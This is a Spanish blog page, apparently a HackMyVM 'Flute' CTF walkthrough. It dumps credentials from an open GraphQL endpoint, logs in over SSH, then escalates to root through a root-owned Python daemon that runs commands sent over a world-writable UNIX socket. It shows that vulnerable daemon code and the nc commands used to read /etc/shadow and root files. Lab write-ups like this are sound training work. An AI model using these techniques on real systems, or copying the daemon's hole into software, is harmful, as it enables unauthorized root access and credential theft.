@@ -1,0 +1,177 @@
+<!doctype html><html lang=es-ES><head><title>Hackmyvm: Flute &ndash; /dev/random</title><meta name=description content="Cultura hacker, software open source y arte hiperdigital"><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=UTF-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin=anonymous referrerpolicy=no-referrer><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><link rel=stylesheet href=https://datadiego.github.io/css/palettes/base16-dark.css><link rel=stylesheet href=https://datadiego.github.io/css/risotto.css><link rel=stylesheet href=https://datadiego.github.io/css/custom.css><link rel=stylesheet href=/css/syntax.css><script src=/js/copy-code.js defer></script><script src=/js/fuzzy-search.js defer></script><meta property="og:title" content="Hackmyvm: Flute &ndash; /dev/random"><meta property="og:url" content="https://datadiego.github.io/posts/flute/"><meta property="og:description" content="Maquina vulnerable flute &ndash; "><meta property="og:locale" content="es-ES"><meta property="og:image" content></head><body><div class=page><header class=page__header><nav class="page__nav main-nav"><ul><li class=nomarker><h1 class=page__logo><a href=https://datadiego.github.io/ class=page__logo-inner>/dev/random</a></h1></li><li class=main-nav__item><a class=nav-main-item href=https://datadiego.github.io/posts/ title>Posts</a></li><li class=main-nav__item><a class=nav-main-item href=https://datadiego.github.io/about/ title>About</a></li></ul></nav></header><section class=page__body><header class=content__header><h1>Hackmyvm: Flute</h1></header><div class=content__body><p>Descargada de <a href=https://downloads.hackmyvm.eu/flute.zip>aqui</a>, en esta máquina debemos encontrar dos flags para completarla.</p><h2 id=reconocimiento>Reconocimiento</h2><p>Desde nmap con <code>-sV</code> obtenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.0.69
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.000055s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE         VERSION
+</span></span><span class=line><span class=cl>22/tcp   open  ssh             OpenSSH 10.0 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl>8888/tcp open  sun-answerbook?
+</span></span></code></pre></div><p>En el puerto 22 hay un servicio ssh, en el 8888 encontramos un servidor web con un <code>Apollo</code>, un servidor de GraphQL.</p><h2 id=servicio-web>Servicio web</h2><p>El servicio web nos deja lanzar queries contra una base de datos.</p><p>Tiene una tabla de <code>Users</code> con dos columnas, <code>username</code> y <code>password</code>.</p><p>Lanzamos una query para obtener ambas columnas:</p><pre tabindex=0><code>query ExampleQuery {
+  users {
+    username, password
+  }
+}
+</code></pre><p>Obtenemos lo siguiente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;data&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;users&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;imtherealadmin&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=p>},</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;hamelin&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;comewithmerats&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>]</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><h2 id=ssh>SSH</h2><p>El usuario <code>admin</code> con la contraseña <code>iamtherealadmin</code> no funciona, pero <code>hamelin</code> si:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>glitch-kitchen master  ❯ ssh admin@192.168.0.69
+</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;192.168.0.69 (192.168.0.69)&#39;</span> can<span class=s1>&#39;t be established.
+</span></span></span><span class=line><span class=cl><span class=s1>ED25519 key fingerprint is: SHA256:pQL6MCusRtFF6QNd7BL9RBACLaGEw9epVnuBo3D9ETc
+</span></span></span><span class=line><span class=cl><span class=s1>This key is not known by any other names.
+</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>192.168.0.69<span class=s1>&#39; (ED25519) to the list of known hosts.
+</span></span></span><span class=line><span class=cl><span class=s1>admin@192.168.0.69&#39;</span>s password:
+</span></span><span class=line><span class=cl>Permission denied, please try again.
+</span></span><span class=line><span class=cl>admin@192.168.0.69<span class=s1>&#39;s password:
+</span></span></span><span class=line><span class=cl><span class=s1>Permission denied, please try again.
+</span></span></span><span class=line><span class=cl><span class=s1>admin@192.168.0.69&#39;</span>s password:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>glitch-kitchen master  ✗ ssh hamelin@192.168.0.69
+</span></span><span class=line><span class=cl>hamelin@192.168.0.69<span class=err>&#39;</span>s password:
+</span></span><span class=line><span class=cl>HackMyVM Flute.
+</span></span><span class=line><span class=cl>flute:~$ whoami
+</span></span><span class=line><span class=cl>hamelin
+</span></span><span class=line><span class=cl>flute:~$
+</span></span></code></pre></div><h2 id=explorando-con-hamelin>Explorando con hamelin</h2><p>Hay los siguientes usuarios:</p><pre tabindex=0><code>flute:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+klogd:x:100:101:klogd:/dev/null:/sbin/nologin
+hamelin:x:1000:1000::/home/hamelin:/bin/sh
+</code></pre><p>En su <code>home</code> encontramos lo siguiente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>flute:~$ whoami
+</span></span><span class=line><span class=cl>hamelin
+</span></span><span class=line><span class=cl>flute:~$ <span class=nb>pwd</span>
+</span></span><span class=line><span class=cl>/home/hamelin
+</span></span><span class=line><span class=cl>flute:~$ ls
+</span></span><span class=line><span class=cl>index.js           package-lock.json  user.txt
+</span></span><span class=line><span class=cl>node_modules       package.json
+</span></span><span class=line><span class=cl>flute:~$ cat user.txt
+</span></span><span class=line><span class=cl>HMVuser9f4ndbaz4chc6j04b3va
+</span></span></code></pre></div><p><code>index.js</code> es el servidor que hay en el puerto 8888, hay un txt con un string, contiene la palabra <code>user</code>.</p><p>En <code>tmp</code> encontramos lo siguiente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>flute:~$ ls /tmp/
+</span></span><span class=line><span class=cl>ratd.sock
+</span></span><span class=line><span class=cl>flute:~$ cat /tmp/ratd.sock
+</span></span><span class=line><span class=cl>cat: can<span class=s1>&#39;t open &#39;</span>/tmp/ratd.sock<span class=err>&#39;</span>: No such device or address
+</span></span></code></pre></div><p>Ejecutamos <code>linpeas</code>, el resultado se encuentra en <code>linpeas.txt</code></p><p>Linpeas encuentra un programa en <code>/opt</code> que tiene que ver con el archivo de <code>tmp</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>flute:~$ tree /opt/
+</span></span><span class=line><span class=cl>/opt/
+</span></span><span class=line><span class=cl>└── ratd
+</span></span><span class=line><span class=cl>    └── ratd.py
+</span></span><span class=line><span class=cl>flute:~$ ls -la /opt/ratd/
+</span></span><span class=line><span class=cl>total <span class=m>12</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>2</span> root     root          <span class=m>4096</span> Mar <span class=m>30</span> 09:42 .
+</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>3</span> root     root          <span class=m>4096</span> Mar <span class=m>30</span> 09:41 ..
+</span></span><span class=line><span class=cl>-rw-r--r--    <span class=m>1</span> root     root           <span class=m>527</span> Mar <span class=m>30</span> 09:42 ratd.py
+</span></span></code></pre></div><p>Es un script de python:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_UNIX</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>socket_path</span> <span class=o>=</span> <span class=s2>&#34;/tmp/ratd.sock&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>socket_path</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>socket_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sock</span><span class=o>.</span><span class=n>bind</span><span class=p>(</span><span class=n>socket_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>chmod</span><span class=p>(</span><span class=n>socket_path</span><span class=p>,</span> <span class=mo>0o777</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sock</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Rat daemon running...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>data</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;RUN &#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>cmd</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=mi>4</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;OK</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Unknown command</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span></code></pre></div><p>El script nos deja ejecutar comandos a través de un socket UNIX, en esta linea:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>os.chmod<span class=o>(</span>socket_path, 0o777<span class=o>)</span>
+</span></span></code></pre></div><p>Se da permiso a todos los usuarios para conectarse a través de <code>/tmp/ratd.socket</code>.</p><p>Con el usuario actual no podemos ni leer ni editar <code>/tmp/ratd.sock</code> ni editar o ejecutar el <code>.py</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>flute:~$ python3 /opt/ratd/ratd.py
+</span></span><span class=line><span class=cl>Traceback <span class=o>(</span>most recent call last<span class=o>)</span>:
+</span></span><span class=line><span class=cl>  File <span class=s2>&#34;/opt/ratd/ratd.py&#34;</span>, line 8, in &lt;module&gt;
+</span></span><span class=line><span class=cl>    os.remove<span class=o>(</span>socket_path<span class=o>)</span>
+</span></span><span class=line><span class=cl>PermissionError: <span class=o>[</span>Errno 1<span class=o>]</span> Operation not permitted: <span class=s1>&#39;/tmp/ratd.sock&#39;</span>
+</span></span><span class=line><span class=cl>flute:~$ cat /tmp/ratd.sock
+</span></span><span class=line><span class=cl>cat: can<span class=s1>&#39;t open &#39;</span>/tmp/ratd.sock<span class=err>&#39;</span>: No such device or address
+</span></span></code></pre></div><p>Sin embargo, no hace falta ejecutarlo, mirando con pstree:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>flute:~$ pstree -p
+</span></span><span class=line><span class=cl>init<span class=o>(</span>1<span class=o>)</span>-+-acpid<span class=o>(</span>2153<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>-crond<span class=o>(</span>2179<span class=o>)</span>-+-node<span class=o>(</span>2182<span class=o>)</span>-+-<span class=o>{</span>DelayedTaskSche<span class=o>}(</span>2265<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>             <span class=p>|</span>            <span class=p>|</span>-<span class=o>{</span>node<span class=o>}(</span>2266<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>             <span class=p>|</span>            <span class=p>|</span>-<span class=o>{</span>node<span class=o>}(</span>2267<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>             <span class=p>|</span>            <span class=p>|</span>-<span class=o>{</span>node<span class=o>}(</span>2268<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>             <span class=p>|</span>            <span class=p>|</span>-<span class=o>{</span>node<span class=o>}(</span>2269<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>             <span class=p>|</span>            <span class=sb>`</span>-<span class=o>{</span>node<span class=o>}(</span>2270<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>             <span class=sb>`</span>-python3<span class=o>(</span>2187<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>-getty<span class=o>(</span>2243<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>-getty<span class=o>(</span>2244<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>-getty<span class=o>(</span>2248<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>-getty<span class=o>(</span>2253<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>-getty<span class=o>(</span>2257<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>-getty<span class=o>(</span>2260<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>-ntpd<span class=o>(</span>2207<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>-sshd<span class=o>(</span>2249<span class=o>)</span>---sshd-session<span class=o>(</span>2276<span class=o>)</span>---sshd-session<span class=o>(</span>2278<span class=o>)</span>---sh<span class=o>(</span>2279<span class=o>)</span>---pstree<span class=o>(</span>20763<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>|</span>-syslogd<span class=o>(</span>2126<span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=sb>`</span>-udhcpc<span class=o>(</span>2066<span class=o>)</span>
+</span></span></code></pre></div><p>Vemos que hay un proceso de python3, si buscamos el PID o ratd con <code>ps aux</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>flute:~$ ps aux <span class=p>|</span> grep ratd
+</span></span><span class=line><span class=cl> <span class=m>2187</span> root      0:00 /usr/bin/python3 /opt/ratd/ratd.py
+</span></span><span class=line><span class=cl><span class=m>20774</span> hamelin   0:00 grep ratd
+</span></span></code></pre></div><p>Asi que podemos conectarnos usando <code>nc -U /tmp/ratd.sock</code> y ejecutar comandos como root directamente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>flute:~$ nc -U /tmp/ratd.sock
+</span></span><span class=line><span class=cl>RUN cat /etc/shadow &gt; /tmp/shadow
+</span></span><span class=line><span class=cl>OK
+</span></span><span class=line><span class=cl>flute:~$ cat /tmp/shadow
+</span></span><span class=line><span class=cl>root:<span class=nv>$6$lKLVkBPLE7X8DT58$YqnZ8UaA6mDzrLNgAxUpx59jtQVtCVpypJBGQFzFDyaCDEe1y9XOKApm3eVFSvZ</span>/yXSjgeCMp9svRT1gvGN4t0:20542:0:::::
+</span></span><span class=line><span class=cl>bin:!::0:::::
+</span></span><span class=line><span class=cl>daemon:!::0:::::
+</span></span><span class=line><span class=cl>lp:!::0:::::
+</span></span><span class=line><span class=cl>sync:!::0:::::
+</span></span><span class=line><span class=cl>shutdown:!::0:::::
+</span></span><span class=line><span class=cl>halt:!::0:::::
+</span></span><span class=line><span class=cl>mail:!::0:::::
+</span></span><span class=line><span class=cl>news:!::0:::::
+</span></span><span class=line><span class=cl>uucp:!::0:::::
+</span></span><span class=line><span class=cl>cron:!::0:::::
+</span></span><span class=line><span class=cl>ftp:!::0:::::
+</span></span><span class=line><span class=cl>sshd:!::0:::::
+</span></span><span class=line><span class=cl>games:!::0:::::
+</span></span><span class=line><span class=cl>ntp:!::0:::::
+</span></span><span class=line><span class=cl>guest:!::0:::::
+</span></span><span class=line><span class=cl>nobody:!::0:::::
+</span></span><span class=line><span class=cl>klogd:!:20542:0:99999:7:::
+</span></span><span class=line><span class=cl>hamelin:<span class=nv>$6$eQldCKVD3lXniza0$e1Nbapd0OuJWkNfNSPotctZ1IF7RsF9GBo3jkEgT7h</span>/E2MyEBkGkXZ5c4EpuOsfFNbc/qcxm.gH/.6OvBQWB80:20542:0:99999:7:::
+</span></span></code></pre></div><p>Hay un archivo en <code>/root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>RUN ls /root &gt; /tmp/resp
+</span></span><span class=line><span class=cl>OK
+</span></span><span class=line><span class=cl>flute:~$ cat /tmp/resp
+</span></span><span class=line><span class=cl>root.txt
+</span></span><span class=line><span class=cl>flute:~$ nc -U /tmp/ratd.sock
+</span></span><span class=line><span class=cl>RUN cat /root/root.txt &gt; /tmp/root.txt
+</span></span><span class=line><span class=cl>OK
+</span></span><span class=line><span class=cl>flute:~$ cat /tmp/root.txt
+</span></span><span class=line><span class=cl>HMVrootoepsamqu0liphzzsc7x9
+</span></span></code></pre></div><p>Hemos conseguido las dos <code>flags</code> de la VM.</p></div><footer class=content__footer></footer></section><section class=page__aside><div class=aside__about><div class=aside__about><span class=about__logo role=img>ᓚᘏᗢ</span>&nbsp;<h1 class=about__title>/dev/random</h1><p class=about__description>Cultura hacker, software open source y arte hiperdigital</p></div><ul class=aside__social-links><li><a href=https://github.com/datadiego rel=me aria-label=GitHub title=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;</li><li><a href=juandiegomariscal@gmail.com rel=me aria-label=Email title=Email><i class="fa-solid fa-envelope" aria-hidden=true></i></a>&nbsp;</li></ul></div><hr><div class=aside__content><p>Maquina vulnerable flute</p><p>By datadiego,
+2025-07-20</p></div></section><footer class=page__footer><p>Este sitio está disponible en versión <a href=http://rogueo7ciqckck2yhf2dqmqxsrav3ydsobcxkun7f5dmysskcxyfgead.onion/>onion</a></p><p class=copyright>© datadiego</p><script src=https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js></script><script>mermaid.initialize({startOnLoad:!0,theme:"dark"})</script></footer></div></body></html>
